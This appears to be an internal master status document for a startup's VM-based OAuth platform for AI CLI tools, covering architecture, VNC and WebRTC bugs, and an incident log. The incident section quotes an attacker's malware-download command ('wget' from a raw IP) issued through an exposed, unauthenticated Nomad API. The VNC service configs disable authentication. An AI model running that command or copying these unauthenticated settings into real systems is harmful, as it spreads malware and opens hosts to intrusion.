# POLYDEV AI - COMPREHENSIVE MASTER SYSTEM DOCUMENTATION

**Last Updated**: November 25, 2025
**Version**: 2.1
**Status**: Production Development - Week 4
**Critical Priority**: WebRTC Server Crash - GStreamer Python Bindings Missing (Blocking Production)

---

## 📋 TABLE OF CONTENTS

1. [Product Overview](#product-overview)
2. [System Architecture](#system-architecture)
3. [User Flow & UX Requirements](#user-flow--ux-requirements)
4. [Technical Implementation](#technical-implementation)
5. [Current Issues & Status](#current-issues--status)
6. [Infrastructure & Security](#infrastructure--security)
7. [Development Roadmap](#development-roadmap)
8. [Deployment & Operations](#deployment--operations)

---

## 🚨 CURRENT STATE OF AFFAIRS (November 25, 2025)

### What's Happening Right Now

**CRITICAL ISSUE**: Browser VMs failing due to WebRTC server crash with `ValueError: Namespace GstWebRTC not available`

**Root Cause Identified**: Missing Python GStreamer bindings in golden rootfs. The WebRTC server requires three packages that were not installed during golden rootfs build:
- `python3-gst-1.0` (Python GStreamer bindings)
- `gir1.2-gst-plugins-bad-1.0` (GObject Introspection for GStreamer Bad Plugins)
- `gir1.2-gstreamer-1.0` (GObject Introspection for GStreamer core)

**What We Did**:
1. Modified `/Users/venkat/Documents/polydev-ai/master-controller/scripts/build-golden-snapshot-production.sh` locally to include the three missing packages in the `install_gstreamer()` function
2. Deployed the updated build script to VPS server at `/opt/master-controller/scripts/build-golden-snapshot-production.sh`
3. Initiated golden rootfs rebuild with the corrected build script
4. Build process is currently running in background (PID varies, check `/tmp/golden-build-with-bindings.log`)

**Build Status**: In Progress
- **Location**: VPS 135.181.138.102
- **Log File**: `/tmp/golden-build-with-bindings.log`
- **Expected Duration**: ~10-15 minutes total
- **Current Phase**: Varies (check log for debootstrap/package installation progress)

### What Needs to Be Done

**Immediate Next Steps** (Sequential):
1. ✅ Wait for golden rootfs rebuild to complete (~10-15 minutes)
2. ⏸️ Verify GStreamer Python packages are installed in new golden rootfs
3. ⏸️ Create test Browser VM using new golden rootfs
4. ⏸️ Verify WebRTC server starts without GStreamer import errors
5. ⏸️ Test complete OAuth flow with new VM to ensure functionality

**Verification Commands**:
```bash
# Check if build is complete
ls -lh /var/lib/firecracker/snapshots/base/golden-rootfs-production.ext4

# Mount and verify packages installed
mount -o loop /var/lib/firecracker/snapshots/base/golden-rootfs-production.ext4 /mnt/test
chroot /mnt/test python3 -c "import gi; gi.require_version('GstWebRTC', '1.0'); print('✅ GstWebRTC available')"
umount /mnt/test

# Create test VM
curl -X POST http://localhost:4000/api/auth/start \
  -H "Content-Type: application/json" \
  -d '{"userId": "test-gstreamer-fix", "provider": "claude_code"}'

# Wait ~3 minutes, then check VM logs for WebRTC server startup
tail -100 /var/lib/firecracker/users/vm-*/console.log | grep -E "(WebRTC|GstWebRTC|ValueError)"
```

### Where We're Stuck

**Current Blocker**: Waiting for golden rootfs rebuild to complete

**Why We're Waiting**:
- Golden rootfs is ~10GB Ubuntu 22.04 filesystem
- Build process includes:
  - Base debootstrap installation (~3-4 minutes)
  - Package installations (XFCE, TigerVNC, Firefox, GStreamer, etc.) (~5-6 minutes)
  - Configuration and cleanup (~2-3 minutes)
- Cannot test fix until new golden rootfs is built

**Risk Factors**:
1. Build script may encounter errors during package installation
2. Network issues could slow down package downloads
3. Disk space constraints (~15GB required for build process)
4. If build fails, need to debug and restart from scratch

**Monitoring Build Progress**:
```bash
# Check build log size (indicates progress)
du -h /tmp/golden-build-with-bindings.log

# Check for GStreamer installation logs
grep -E "(python3-gst-1.0|gir1.2-gst-plugins-bad|gir1.2-gstreamer)" /tmp/golden-build-with-bindings.log

# Check for errors
grep -i "error" /tmp/golden-build-with-bindings.log | tail -20

# Check if build process is still running
ps aux | grep build-golden-snapshot-production | grep -v grep
```

**Estimated Time to Resolution**:
- Build completion: ~10-15 minutes from start
- Verification: ~5 minutes
- Test VM creation and validation: ~5-10 minutes
- **Total**: ~20-30 minutes

### Previous Context (VNC Display Issue)

**Note**: The VNC display issue documented extensively in this file was a separate problem that has been deprioritized in favor of fixing the WebRTC server crash. The VNC system is functional (port 5901 opens, noVNC connects), but the display shows a small window instead of full-screen XFCE desktop. This is a UX issue but not blocking core functionality.

The WebRTC server crash is more critical because it prevents Browser VMs from becoming ready at all, blocking the entire OAuth authentication flow.

---

## IMPLEMENTATION STATUS SUMMARY

### ✅ WHAT'S WORKING

**Core Infrastructure**:
- ✅ Firecracker VM creation and management
- ✅ Network configuration (bridge, TAP interfaces, IP allocation)
- ✅ Golden rootfs cloning (with 90s timeout)
- ✅ VM lifecycle management (create, destroy, health checks)
- ✅ Supabase database integration
- ✅ Encryption for credentials (AES-256-GCM)

**OAuth Authentication Flow**:
- ✅ CLI tool OAuth flow (claude, codex, gemini commands)
- ✅ OAuth callback handling
- ✅ Credential saving and encryption
- ✅ Browser-based OAuth completion

**Frontend & Backend**:
- ✅ Next.js frontend with provider selection
- ✅ Master controller (Node.js + Express)
- ✅ WebRTC offer race condition fix
- ✅ Health check retry logic (10 retries, 2s delays)
- ✅ VM boot timeouts increased (180s)

**Security**:
- ✅ UFW firewall active and configured
- ✅ Nomad service disabled (after DDoS attack)
- ✅ Security monitoring (hourly cron)

### ⚠️ IMPLEMENTED BUT NOT DEPLOYED

**Redis Session Management (ARCH-1 Fix)**:
- ⚠️ Redis client service complete
- ⚠️ Automatic session TTL expiration (600s)
- ⚠️ Session CRUD operations
- ⚠️ Health check monitoring
- ⚠️ End-to-end tests passing
- **STATUS**: Ready to deploy, waiting for Redis installation on VPS

### ❌ NOT YET IMPLEMENTED (CRITICAL)

**VNC Display Issue** 🔴 **BLOCKING PRODUCTION**:
- ❌ Full 1920x1080 XFCE desktop (currently shows tiny window)
- ❌ TigerVNC xstartup script execution
- ❌ Terminal window auto-opening
- ❌ Firefox browser auto-opening

**User Experience Features**:
- ❌ Automatic token detection after OAuth completion
- ❌ Automatic VM closure after token detection
- ❌ "Successfully Connected!" automatic display
- ❌ Hardcoded VPS IP (needs environment variable)
- ❌ Clear instructions showing exact command to type

**Production Readiness**:
- ❌ Error log preservation on VM cleanup
- ❌ Session management dashboard
- ❌ Usage analytics
- ❌ Load balancing across multiple VPS hosts

### 🏗️ FUTURE IMPLEMENTATION

**CLI VM Architecture**:
- Headless golden rootfs for CLI execution
- Credential loading mechanism
- Command streaming via WebSocket
- Automatic hibernation/wake

**Multi-Provider Support**:
- OpenAI Codex integration
- Google Gemini integration
- Additional AI CLI tools

**Enterprise Features**:
- Team accounts
- Usage quotas
- Billing integration
- Admin dashboard

---

## PRODUCT OVERVIEW

### What is Polydev AI?

**Polydev AI converts chat-based AI subscriptions into API access through CLI tools.**

Instead of using web chat interfaces (Claude.ai, ChatGPT web UI, Gemini), users run CLI commands (`claude`, `codex`, `gemini`) that programmatically access their subscriptions as if they were API endpoints.

### Core Value Proposition

- **Subscription to API Conversion**: Transform $20/month ChatGPT Plus → unlimited API access
- **No API Costs**: Users keep their existing subscriptions (Claude Pro, ChatGPT Plus, Gemini Advanced)
- **CLI Tool Access**: Use `claude`, `chatgpt`, `gemini` commands instead of web interfaces
- **Automation-Ready**: Integrate AI into scripts, workflows, and applications

### Key Differentiator

**We use CLI tools, NOT browser automation of chat web interfaces.**

- ❌ **Wrong**: Selenium/Puppeteer controlling chat.openai.com
- ✅ **Correct**: Official CLI tools (`claude`, OpenAI CLI, Gemini CLI) with OAuth authentication

---

## SYSTEM ARCHITECTURE

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        POLYDEV AI PLATFORM                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Frontend (Next.js)                                              │
│  ↓                                                               │
│  Master Controller (Node.js)                                     │
│  ↓                                                               │
│  ┌────────────────┐          ┌────────────────┐                │
│  │  Browser VM     │          │  CLI VM         │                │
│  │  (VNC Access)   │  →       │  (CLI Tools)    │                │
│  │                 │          │                 │                │
│  │  - TigerVNC     │          │  - claude       │                │
│  │  - XFCE Desktop │          │  - codex        │                │
│  │  - Firefox      │          │  - gemini       │                │
│  │  - Terminal     │          │                 │                │
│  │  - OAuth Flow   │          │  - Saved Creds  │                │
│  └────────────────┘          └────────────────┘                │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Two Types of VMs

#### 1. **Browser VM** (Firecracker microVM)

**Purpose**: Execute OAuth authentication flows in a secure browser environment

**Components**:
- **Operating System**: Ubuntu 22.04 (minimal)
- **Display Server**: TigerVNC + XFCE Desktop (1920x1080)
- **Browser**: Firefox (for OAuth completion)
- **Terminal**: XFCE Terminal (for typing CLI commands)
- **Access Method**: noVNC (WebSocket-based VNC in browser)

**Lifecycle (Intended Workflow)**:
1. User visits `http://localhost:3000/dashboard/remote-cli`
2. User clicks "Connect Claude Code" button
3. Master Controller creates Firecracker VM (15-30 seconds goal, currently 45-60s)
4. VM boots with TigerVNC + XFCE desktop
5. **CRITICAL: Terminal AND Firefox browser MUST auto-open in XFCE** ⚠️ (NOT YET IMPLEMENTED)
6. User accesses VM via noVNC iframe in their browser
7. User types CLI command in terminal (`claude`, `codex`, or `gemini`)
8. **CLI automatically opens OAuth URL in Firefox browser inside VM** (agent-managed)
9. User completes OAuth authentication in VM browser
10. **System automatically detects token saving** ⚠️ (NOT YET IMPLEMENTED)
11. **VM automatically closes after token detection** ⚠️ (NOT YET IMPLEMENTED)
12. Encrypted credentials transferred to user account (IMPLEMENTED)

#### 2. **CLI VM** (Future Implementation)

**Purpose**: Run actual CLI tools using saved credentials

**Components**:
- **Operating System**: Ubuntu 22.04 (minimal, headless)
- **CLI Tools**: `claude`, `chatgpt` CLI, `gemini` CLI
- **Credentials**: Loaded from encrypted storage
- **Access Method**: WebSocket/SSH (command streaming)

**Lifecycle**:
1. User sends prompt via API or web interface
2. Master Controller spins up CLI VM
3. VM loads encrypted credentials
4. CLI command executed: `claude "What is 2+2?"`
5. Response streamed back to user
6. VM hibernates or destroyed after inactivity

---

## USER FLOW & UX REQUIREMENTS

### Current Flow (Browser VM OAuth)

This is the **CRITICAL PATH** that is currently broken due to VNC display issues.

#### Step 1: Provider Selection

```
┌─────────────────────────────────────────────────────┐
│  Remote CLI Dashboard                               │
│  ┌─────────────┐ ┌─────────────┐ ┌──────────────┐ │
│  │ Claude Code │ │ OpenAI      │ │ Google       │ │
│  │             │ │ Codex       │ │ Gemini       │ │
│  │  [Connect]  │ │  [Connect]  │ │  [Connect]   │ │
│  └─────────────┘ └─────────────┘ └──────────────┘ │
└─────────────────────────────────────────────────────┘
```

- **URL**: `http://localhost:3000/dashboard/remote-cli`
- **Action**: User clicks "Connect Claude Code"
- **Backend**: `POST /api/vm/auth` → Creates Browser VM

#### Step 2: VM Creation (Loading Screen)

```
┌─────────────────────────────────────────────────────┐
│  Creating Your Secure Environment                   │
│                                                      │
│  [●──────] Allocating VM resources                  │
│  [●──────] Configuring secure network               │
│  [●──────] Starting VNC and desktop                 │
│                                                      │
│  ⏱️ Usually takes 45-60 seconds                     │
└─────────────────────────────────────────────────────┘
```

**Backend Process**:
1. Clone golden rootfs (6.8GB) - ~30-60s
2. Create Firecracker VM with 1 vCPU, 1.5GB RAM
3. Assign IP from pool (192.168.100.2-254)
4. Start VM and wait for boot
5. Wait for TigerVNC service to start (port 5901)
6. Wait for OAuth agent to start (port 8080)
7. Verify health checks pass
8. Return session info to frontend

#### Step 3: VM Desktop Display 🔴 **BROKEN - CRITICAL ISSUE**

**What User SHOULD See**:

```
┌─────────────────────────────────────────────────────────────────┐
│  VM Desktop - Full HD 1920x1080                    [ Minimize ] │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │ XFCE Terminal - OPEN and MAXIMIZED       [_][□][X]       │ │
│  ├───────────────────────────────────────────────────────────┤ │
│  │ root@vm-xxxx:~$ _                                         │ │
│  │                                                            │ │
│  │ (User can immediately type 'claude' here)                 │ │
│  │                                                            │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │ Firefox Browser - OPEN (behind terminal)  [_][□][X]      │ │
│  ├───────────────────────────────────────────────────────────┤ │
│  │ ⬅️ ➡️ 🔄  🏠  (about:blank)                               │ │
│  │                                                            │ │
│  │               (Ready for OAuth URL)                        │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                  │
│  [XFCE Taskbar: Terminal | Firefox | System Menu | Clock]      │
└─────────────────────────────────────────────────────────────────┘
```

**✅ Requirements**:
- Full 1920x1080 resolution (NOT small window)
- XFCE desktop environment with taskbar
- Terminal window OPEN, MAXIMIZED, and in FOCUS
- Firefox browser OPEN but behind terminal
- Both applications ready immediately
- No black screen or display corruption

**❌ Current Broken State**:

```
VNC Desktop Display (BROKEN):
┌─────────────────────────────────────┐
│                                      │
│  [Black screen - no desktop]         │
│                                      │
│                                      │
│  ┌──────┐                           │
│  │xterm │ ← Tiny window              │
│  │  $   │    at bottom-left          │
│  └──────┘                            │
└─────────────────────────────────────┘
```

**Problems**:
- ❌ Not full 1920x1080 resolution
- ❌ Shows tiny xterm window instead of XFCE desktop
- ❌ No terminal or browser windows auto-opening
- ❌ No XFCE desktop environment visible
- ❌ Black screen with orphaned window
- ❌ User cannot see where to type commands

**Root Cause**: TigerVNC's xstartup script not being executed → XFCE not starting → Small fallback xterm window shown

**See**: [ERROR #1](#error-1-vnc-display-shows-small-window-instead-of-full-screen) for full analysis

#### Step 4: User Types CLI Command

**Instructions Shown to User**:

```
┌─────────────────────────────────────────────────────┐
│  Authentication Steps                               │
│                                                      │
│  1️⃣ Access VM Desktop ✅ visible above              │
│                                                      │
│  2️⃣ Type the authentication command:                │
│     In the terminal window, type:                   │
│                                                      │
│     $ claude                                        │
│                                                      │
│  3️⃣ Complete OAuth in the browser window            │
│     The CLI will open the OAuth page automatically  │
│                                                      │
│  4️⃣ We'll detect completion automatically           │
│     Once done, this page will advance               │
└─────────────────────────────────────────────────────┘
```

**User Actions (Intended Workflow)**:
1. ⚠️ **NOT YET IMPLEMENTED**: User sees terminal auto-opened in VM desktop (currently requires manual opening)
2. User types: `claude` (or `codex`, `gemini`)
3. CLI tool starts OAuth flow (IMPLEMENTED ✅)
4. CLI prints: "Opening browser for authentication..." (IMPLEMENTED ✅)
5. ⚠️ **NOT YET IMPLEMENTED**: Firefox window auto-opens (currently requires manual Firefox launch)
6. Browser opens OAuth URL (e.g., `https://console.anthropic.com/oauth/authorize`) (IMPLEMENTED ✅)
7. User logs into Anthropic account (IMPLEMENTED ✅)
8. OAuth callback received by CLI (IMPLEMENTED ✅)
9. CLI saves credentials (IMPLEMENTED ✅)
10. ⚠️ **NOT YET IMPLEMENTED**: OAuth agent detects completion automatically
11. ⚠️ **NOT YET IMPLEMENTED**: Frontend shows "Successfully Connected!" automatically
12. Credentials encrypted and stored (IMPLEMENTED ✅)
13. ⚠️ **NOT YET IMPLEMENTED**: VM auto-closes after token detection (currently requires manual cleanup)

#### Step 5: Success

```
┌─────────────────────────────────────────────────────┐
│  ✅ Successfully Connected!                         │
│                                                      │
│  Your Claude Code CLI is now authenticated          │
│                                                      │
│  What's Next?                                        │
│  ✓ Credentials securely encrypted                   │
│  ✓ Ready to use API access                          │
│  ✓ You can start sending prompts                    │
│                                                      │
│  [Back to Dashboard]  [Start Using]                 │
└─────────────────────────────────────────────────────┘
```

---

## TECHNICAL IMPLEMENTATION

### Frontend (Next.js + React)

**Location**: `/src/app/dashboard/remote-cli/`

**Key Components**:
- **page.tsx**: Main dashboard with provider selection
- **auth/page.tsx**: OAuth flow UI with noVNC iframe
- **WebRTCViewer.tsx**: WebRTC video streaming component

**Architecture**:
```typescript
// User clicks "Connect"
const handleConnectProvider = async (providerId: string) => {
  // 1. Create WebRTC offer FIRST (race condition fix)
  const offer = await createWebRTCOffer();

  // 2. Create session with offer included
  const res = await fetch('/api/vm/auth', {
    method: 'POST',
    body: JSON.stringify({
      provider: providerId,
      webrtcOffer: offer
    })
  });

  // 3. Navigate to auth page
  router.push(`/dashboard/remote-cli/auth?sessionId=${sessionId}`);
};
```

**Current Implementation Status**:
- ✅ WebRTC offer race condition FIXED
- ❌ Hardcoded VPS IP (needs environment variable) - **NOT FIXED**
- ⚠️ Loads stale sessions from database - **FIX READY** (Redis implementation complete but not deployed)
- ⚠️ No automatic cleanup of dead sessions - **FIX READY** (Redis TTL auto-expiration ready but not deployed)
- ❌ Instructions don't show exact command to type - **NOT FIXED**

### Master Controller (Node.js + Express)

**Location**: `/master-controller/`

**Key Services**:

#### 1. VM Manager (`src/services/vm-manager.js`)

**Responsibilities**:
- Create/destroy Firecracker VMs
- Network management (IP allocation)
- Golden rootfs cloning
- Health checks and monitoring

**Critical Functions**:
```javascript
async createBrowserVM(sessionId, userId, provider) {
  // 1. Clone golden rootfs (6.8GB, 90s timeout)
  const vmRootfs = await this.cloneGoldenRootfs(vmId);

  // 2. Allocate IP from pool
  const vmIP = await this.networkManager.allocateIP();

  // 3. Create TAP interface
  await this.createTapInterface(tapDevice, vmIP);

  // 4. Start Firecracker VM
  await this.startFirecracker(vmId, vmRootfs, tapDevice);

  // 5. Wait for VM to be ready (180s timeout)
  await this.waitForVMReady(vmIP, 180000);

  return { vmId, vmIP };
}
```

**Timeout Configuration**:
```javascript
// config/index.js
performance: {
  browserVmHealthTimeoutMs: 180000, // 3 minutes
  vmIdleTimeout: 1800000, // 30 minutes
  vmDestroyTimeout: 1209600000 // 14 days
}
```

#### 2. Browser VM Auth (`src/services/browser-vm-auth.js`)

**Responsibilities**:
- Manage OAuth authentication flow
- Session lifecycle management
- Credential encryption and storage

**Redis Integration (ARCH-1 FIX)**:
```javascript
async startAuthentication(userId, provider, webrtcOffer) {
  // Create session in database
  const authSession = await db.authSessions.create(userId, provider);
  const sessionId = authSession.session_id;

  // CRITICAL: Store session in Redis with TTL (auto-expires)
  if (this.redisConnected) {
    await redisClient.setSession(sessionId, {
      sessionId,
      userId,
      provider,
      status: 'pending',
      createdAt: new Date().toISOString()
    }, 600); // 10 minutes TTL
  }

  // Create Browser VM
  const { vmId, vmIP } = await vmManager.createBrowserVM(sessionId, userId, provider);

  return { sessionId, vmIP };
}
```

**Health Check Logic**:
```javascript
async waitForVMReady(vmIP, maxWaitMs = 180000) {
  // Initial delay for OAuth agent startup
  await sleep(45000); // 45s for OAuth agent + TigerVNC

  const startTime = Date.now();
  let retries = 0;
  const MAX_RETRIES = 10;

  while (Date.now() - startTime < maxWaitMs) {
    try {
      // Check OAuth agent health (port 8080)
      const healthResp = await axios.get(`http://${vmIP}:8080/health`, {
        timeout: 5000
      });

      if (healthResp.status === 200) {
        // Extra delay for VNC RFB initialization
        await sleep(15000);
        return true;
      }
    } catch (error) {
      if (error.code === 'EHOSTUNREACH' || error.code === 'ETIMEDOUT') {
        retries++;
        if (retries < MAX_RETRIES) {
          await sleep(2000); // Wait 2s before retry
          continue;
        }
      }
      throw error;
    }
  }

  throw new Error('VM not ready after timeout');
}
```

#### 3. WebRTC Signaling (`src/services/webrtc-signaling.js`)

**Responsibilities**:
- Store WebRTC offers/answers
- Manage ICE candidates
- Coordinate WebRTC connections

**Race Condition Fix**:
```javascript
// Frontend creates offer BEFORE calling /api/auth/start
// Master controller stores it BEFORE creating VM
// VM polls for offer when it boots → offer already exists ✅

class WebRTCSignalingService {
  async storeOffer(sessionId, offer, candidates) {
    this.sessions.set(sessionId, {
      offer,
      candidates,
      answer: null,
      createdAt: Date.now()
    });

    logger.info('[RACE-FIX] Offer stored before VM creation', {
      sessionId,
      candidateCount: candidates.length
    });
  }
}
```

#### 4. Redis Client (`src/services/redis-client.js`)

**Purpose**: Ephemeral session storage with automatic TTL expiration (ARCH-1 Fix)

**Key Features**:
- Automatic session expiration (default 600s)
- Connection retry with exponential backoff
- Health check monitoring
- Session CRUD operations

**Implementation**:
```javascript
class RedisClient {
  async setSession(sessionId, sessionData, ttl = 600) {
    const key = `session:${sessionId}`;
    await this.client.setex(key, ttl, JSON.stringify(sessionData));

    logger.info('[REDIS] Session saved with TTL', {
      sessionId,
      ttl,
      dataSize: JSON.stringify(sessionData).length
    });
  }

  async getSession(sessionId) {
    const key = `session:${sessionId}`;
    const data = await this.client.get(key);

    if (!data) {
      // Session expired or never existed
      // → Frontend should show "Start New Session"
      return null;
    }

    return JSON.parse(data);
  }
}
```

**Why Redis Instead of Supabase?**

| Aspect | Supabase (PostgreSQL) | Redis |
|--------|----------------------|-------|
| **Persistence** | Permanent ❌ | Ephemeral with TTL ✅ |
| **Expiration** | Manual cleanup ❌ | Auto-expires ✅ |
| **Performance** | Disk I/O | In-memory ✅ |
| **Use Case** | Long-term data | Temporary sessions ✅ |
| **Cleanup** | Cron jobs needed ❌ | Automatic ✅ |

### VNC/noVNC Setup

#### Current Broken Architecture

**Golden Rootfs Configuration** (`/var/lib/firecracker/snapshots/base/golden-browser-rootfs.ext4`):

**Problem**: Direct `Xtigervnc` execution bypasses xstartup script

```bash
# /etc/systemd/system/tigervnc.service (BROKEN)
[Unit]
Description=TigerVNC Server
After=network.target

[Service]
Type=forking
User=root
WorkingDirectory=/root
Environment=HOME=/root DISPLAY=:1

# PROBLEM: Direct Xtigervnc doesn't run ~/.vnc/xstartup
ExecStart=/usr/bin/Xtigervnc :1 \
  -geometry 1920x1080 \
  -depth 24 \
  -rfbport 5901 \
  -localhost no \
  -SecurityTypes None

[Install]
WantedBy=multi-user.target
```

**xstartup Script** (`/root/.vnc/xstartup`) - **NOT BEING EXECUTED**:

```bash
#!/bin/sh
# This script should start XFCE desktop but is never run
unset SESSION_MANAGER
unset DBUS_SESSION_BUS_ADDRESS
exec startxfce4
```

**Result**: No XFCE desktop → Small xterm window shown as fallback

#### Required Fix

**Option 1: Use vncserver Wrapper** (Preferred):

```bash
# Requires: apt-get install tigervnc-standalone-server

# /etc/systemd/system/tigervnc.service (CORRECT)
[Service]
ExecStart=/usr/bin/vncserver :1 \
  -geometry 1920x1080 \
  -depth 24 \
  -localhost no \
  -rfbport 5901 \
  -SecurityTypes None
```

**Option 2: Switch to x11vnc + Xvfb**:

```bash
# More reliable for headless VMs

# Start Xvfb (X virtual framebuffer)
Xvfb :1 -screen 0 1920x1080x24 &

# Start XFCE on display :1
DISPLAY=:1 startxfce4 &

# Start x11vnc
x11vnc -display :1 -forever -shared -rfbport 5901
```

### WebSocket VNC Proxy

**Location**: `/master-controller/src/services/vnc-websocket-proxy.js`

**Purpose**: Route noVNC WebSocket connections to correct VM's VNC port

**Implementation**:
```javascript
class VNCWebSocketProxy {
  handleUpgrade(req, socket, head, vmIP) {
    const ws = new WebSocket.Server({ noServer: true });

    ws.handleUpgrade(req, socket, head, (client) => {
      // Connect to VM's VNC port
      this.connectToVNCWithRetry(client, vmIP, connectionId, 0);
    });
  }

  async connectToVNCWithRetry(ws, vmIP, connectionId, attempt) {
    const vncSocket = net.connect(5901, vmIP);

    vncSocket.on('error', (err) => {
      const isRetryable = err.code === 'EHOSTUNREACH' ||
                          err.code === 'ETIMEDOUT' ||
                          err.code === 'ECONNREFUSED';

      if (isRetryable && attempt < MAX_RETRIES) {
        setTimeout(() => {
          this.connectToVNCWithRetry(ws, vmIP, connectionId, attempt + 1);
        }, RETRY_DELAY_MS);
      } else {
        ws.close(1011, `VNC connection error: ${err.message}`);
      }
    });

    // Bidirectional pipe: WebSocket ↔ TCP
    vncSocket.pipe(ws);
    ws.pipe(vncSocket);
  }
}
```

### Network Architecture

**IP Pool**: 192.168.100.2 - 192.168.100.254

**Bridge**: `fcbr0` (192.168.100.1)

**VM Network Configuration**:
```javascript
// Each VM gets:
- TAP interface: tap-${vmId}
- Static IP: Allocated from pool
- Gateway: 192.168.100.1
- DNS: 8.8.8.8, 8.8.4.4

// Kernel boot args:
`ip=${vmIP}::${gatewayIP}:${netmask}::eth0:off net.ifnames=0 biosdevname=0`
```

---

## CURRENT ISSUES & STATUS

### CRITICAL Issues (Blocking Production) 🔴

#### ERROR #1: VNC Display Shows Small Window Instead of Full Screen

**Severity**: 🔴 **CRITICAL - BLOCKING PRODUCTION**
**Status**: ❌ **UNRESOLVED (Week 4)**
**First Encountered**: November 17-18, 2025

**Symptom**:
- VNC port 5901 is open and responding ✅
- noVNC connects successfully ✅
- Display shows BLACK screen with tiny xterm window at bottom-left ❌
- Expected: Full 1920x1080 XFCE desktop with terminal + Firefox

**Root Cause**:
- Direct `Xtigervnc` execution bypasses `~/.vnc/xstartup` script
- Only `vncserver` wrapper executes xstartup
- `vncserver` command doesn't exist in golden rootfs (missing from TigerVNC package)
- XFCE desktop not starting → fallback to small xterm window

**Attempted Fixes** (All Failed):
1. ❌ Created xstartup script → Never executed
2. ❌ Tried to install vncserver → Command not found
3. ❌ Added XFCE autostart scripts → XFCE not running
4. ❌ Configured systemd service dependencies → Still broken
5. ⏳ Currently attempting: x11vnc + Xvfb instead of TigerVNC

**Impact**:
- **CORE FUNCTIONALITY BROKEN**
- User cannot see where to type commands
- Cannot complete OAuth flow
- Product unusable in current state

**Files Involved**:
- `/var/lib/firecracker/snapshots/base/golden-browser-rootfs.ext4` (golden rootfs)
- Inside rootfs: `/etc/systemd/system/tigervnc.service`
- Inside rootfs: `/root/.vnc/xstartup`

**Required Fix**:
- Rebuild golden rootfs with proper TigerVNC installation
- OR switch to x11vnc + Xvfb
- Add XFCE autostart entries for terminal + Firefox
- Verify full 1920x1080 display works

**Documentation**: `VNC_DISPLAY_ISSUE_COMPLETE_ANALYSIS.md`

#### ERROR #2: Terminal Window Not Auto-Opening

**Severity**: 🔴 **CRITICAL - BLOCKING UX**
**Status**: ❌ **NOT IMPLEMENTED**
**Related to**: ERROR #1 (VNC display issue)

**Symptom**:
- Even if VNC worked, no terminal window auto-opens
- User sees empty XFCE desktop
- User doesn't know what to do

**Required**:
```bash
# In golden rootfs: /root/.config/autostart/01-terminal.desktop
[Desktop Entry]
Type=Application
Name=Terminal
Exec=xfce4-terminal --maximize --title="Polydev CLI Authentication"
Terminal=false
StartupNotify=false
X-XFCE-Autostart-Override=true
```

**Status**: Not implemented yet

#### ERROR #3: Firefox Browser Not Auto-Opening

**Severity**: 🟠 **HIGH - IMPACTS UX**
**Status**: ❌ **NOT IMPLEMENTED**

**Required**:
```bash
# In golden rootfs: /root/.config/autostart/02-firefox.desktop
[Desktop Entry]
Type=Application
Name=Firefox
Exec=sh -c "sleep 3 && firefox --new-instance"
Terminal=false
StartupNotify=false
```

**Status**: Not implemented yet

---

### HIGH Priority Issues 🟠

#### ERROR #4: DDoS Attack from Nomad API Exposure

**Severity**: 🔴 **CRITICAL - SECURITY INCIDENT**
**Status**: ✅ **RESOLVED** (November 24, 2025)
**Date**: November 23, 2025 23:54-23:55 UTC

**What Happened**:
- VPS 135.181.138.102 launched UDP flood DDoS attack
- Target: 45.8.173.1:10
- Hetzner locked VPS immediately
- Malicious process: `wget http://91.92.242.138/hcl.sh`
- Parent: Nomad (PID 1615563, running as `nobody` user)

**Root Cause**:
```hcl
# /etc/nomad.d/nomad.hcl
bind_addr = "0.0.0.0"    # ❌ Exposed to internet
acl { enabled = false }  # ❌ No authentication
```

**Attack Vector**:
1. Attackers scanned internet for exposed Nomad APIs
2. Found port 4646 open (HTTP API)
3. Submitted malicious job without authentication
4. Job downloaded malware: `wget http://91.92.242.138/hcl.sh`
5. Malware launched DDoS attack

**Fix Applied**:
- ✅ Stopped and disabled Nomad service
- ✅ Added UFW firewall rules (deny 4646-4648)
- ✅ Verified system clean
- ✅ Created automated security monitoring (hourly cron)

**Prevention**:
```bash
# UFW rules added
ufw deny 4646/tcp comment 'Nomad HTTP API - BLOCKED'
ufw deny 4647/tcp comment 'Nomad RPC - BLOCKED'
ufw deny 4648 comment 'Nomad Serf - BLOCKED'
```

**Documentation**: `HETZNER_UNLOCK_REQUEST.md`

#### ERROR #5: UFW Firewall Completely Disabled

**Severity**: 🔴 **CRITICAL - SECURITY VULNERABILITY**
**Status**: ✅ **RESOLVED** (November 24, 2025)

**Symptom**:
```bash
$ ufw status
Status: inactive  # ❌ NO FIREWALL PROTECTION!
```

**Impact**:
- All ports exposed to internet
- Nomad API accessible (led to DDoS attack)
- No protection against port scanning

**Fix Applied**:
```bash
# Reset and reconfigure UFW
ufw --force reset
ufw default deny incoming
ufw default allow outgoing

# Allow only essential services
ufw allow 22/tcp comment 'SSH access'
ufw allow 80/tcp comment 'HTTP (Nginx)'
ufw allow 443/tcp comment 'HTTPS (Nginx)'

# Block attack vectors
ufw deny 4646-4648 comment 'Nomad - BLOCKED'
ufw deny 9090/tcp comment 'Prometheus - BLOCKED'

# Enable firewall
ufw --force enable
```

**Prevention**:
- Updated `security-monitor.sh` to check UFW status
- Auto-enables UFW if disabled
- Hourly monitoring via cron

**Current Status**: ✅ UFW active and monitored

#### ERROR #6: WebRTC Offer/Answer Race Condition

**Severity**: 🟠 **HIGH - CONNECTION FAILURES**
**Status**: ✅ **FIXED** (November 2025)

**Problem**:
- Browser created WebRTC offer AFTER calling `/api/auth/start`
- VM booted and polled for offer → not found yet
- Resulted in timeouts and connection failures

**Timing Diagram (BROKEN)**:
```
Time  Browser                    Master Controller         VM
0s    Click "Connect"
1s    POST /api/auth/start →
2s                              Create session
3s                              Start VM creation
...
15s                             VM boots
16s                                                    ← Polls for offer
17s                                                    ← No offer! Wait...
18s   (Now creating offer...)
19s   POST /api/webrtc/offer →
20s                             Store offer
21s                                                    ← Gets offer (delayed)
```

**Fix Applied**:
```typescript
// Frontend: Create offer BEFORE calling /api/auth/start
const offer = await createWebRTCOffer(); // Includes ICE candidates

const res = await fetch('/api/vm/auth', {
  method: 'POST',
  body: JSON.stringify({
    provider: providerId,
    webrtcOffer: {
      offer: pc.localDescription,
      candidates: iceCandidates
    }
  })
});

// Master controller stores offer BEFORE VM creation
